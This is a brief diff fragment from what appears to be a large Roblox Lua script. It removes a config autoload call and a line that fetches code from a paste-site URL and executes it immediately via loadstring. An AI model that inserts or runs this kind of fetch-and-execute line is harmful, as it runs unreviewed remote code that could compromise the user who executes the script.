@@ -10273,5 +10273,3 @@ task.spawn(function()
     end
 end)
 
-SaveManager:LoadAutoloadConfig()
-loadstring(game:HttpGet'https://pastefy.app/msii94Qa/raw')()
